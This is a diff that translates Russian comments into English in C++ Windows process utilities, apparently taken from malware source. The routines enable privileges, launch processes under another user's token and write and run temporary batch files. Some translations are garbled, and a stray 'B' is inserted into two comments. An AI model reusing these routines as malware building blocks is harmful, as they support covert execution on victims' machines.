@@ -98,7 +98,7 @@ TOKEN_USER *Process::_getUserByProcessId(DWORD id, LPDWORD sessionId)
 
 DWORD Process::_getCountOfThreadsByProcessId(DWORD id)
 {
-  //FIXME: Найти более быстрый способ.
+  //FIXME: find a faster way.
   HANDLE snapshot = CWA(kernel32, CreateToolhelp32Snapshot)(TH32CS_SNAPTHREAD, 0);
   if(snapshot != INVALID_HANDLE_VALUE)
   {
@@ -126,9 +126,9 @@ bool Process::_enablePrivilege(LPWSTR privilegeName, bool enable)
 {
   HANDLE token;
 
-  if(CWA(advapi32, OpenThreadToken)(CWA(kernel32, GetCurrentThread)(), TOKEN_ADJUST_PRIVILEGES/* | TOKEN_QUERY*/, FALSE, &token) == FALSE)
+  if(CWA(advapi32, OpenThreadToken)(CWA(kernel32, GetCurrentThread)(), TOKEN_ADJUST_PRIVILEGES/*B | TOKEN_QUERY*/, FALSE, &token) == FALSE)
   {
-    if(CWA(advapi32, OpenProcessToken)(CURRENT_PROCESS, TOKEN_ADJUST_PRIVILEGES/* | TOKEN_QUERY*/, &token) == FALSE)
+    if(CWA(advapi32, OpenProcessToken)(CURRENT_PROCESS, TOKEN_ADJUST_PRIVILEGES/*B | TOKEN_QUERY*/, &token) == FALSE)
     {
       return false;
     }
@@ -293,11 +293,11 @@ DWORD Process::_createAsUser(HANDLE token, const LPWSTR desktop, const LPWSTR mo
     DESTROYENVIRONMENTBLOCK destroyEnvironmentBlock = (DESTROYENVIRONMENTBLOCK)CWA(kernel32, GetProcAddress)(dll, "DestroyEnvironmentBlock");
     if(createEnvironmentBlock != NULL && destroyEnvironmentBlock != NULL)
     {
-      //Создаем переменные окружения.
+      //Create an environment variable.
       void *environment = NULL;
-      if(createEnvironmentBlock(&environment, token, FALSE) == FALSE)environment = NULL; //Параноя.
+      if(createEnvironmentBlock(&environment, token, FALSE) == FALSE)environment = NULL; //Paranoia.
 
-      //Создаем процесс, полный аналог create().
+      //Create a process full of analogue create ().
       {
         WCHAR zeroStr[1];
         zeroStr[0] = 0;
@@ -426,12 +426,12 @@ bool Process::_runTempBatch(const LPSTR context)
   WCHAR batFileW[MAX_PATH];
   if(Fs::_createTempFileEx(NULL, L"bat", batFileW))
   {
-    //Создаем батник.
+    //Create a batch file.
     {
       LPSTR buf;
       int bufSize;
 
-      //Создаем скрипт.
+      //Create a script.
       {
         char batFileA[MAX_PATH];
         CWA(user32, CharToOemW)(batFileW, batFileA);
@@ -439,13 +439,13 @@ bool Process::_runTempBatch(const LPSTR context)
         if(bufSize == -1)goto BADEND;
       }
 
-      //Сохраняем.
+      //Save.
       bool ok = Fs::_saveToFile(batFileW, buf, bufSize);
       Mem::free(buf);
       if(!ok)goto BADEND;
     }
 
-    //Запускаем батник.
+    //Run the batch file.
     {
       WCHAR cmdLine[MAX_PATH + 10];
       if(Str::_sprintfW(cmdLine, sizeof(cmdLine) / sizeof(WCHAR), L"/c \"%s\"", batFileW) > -1)
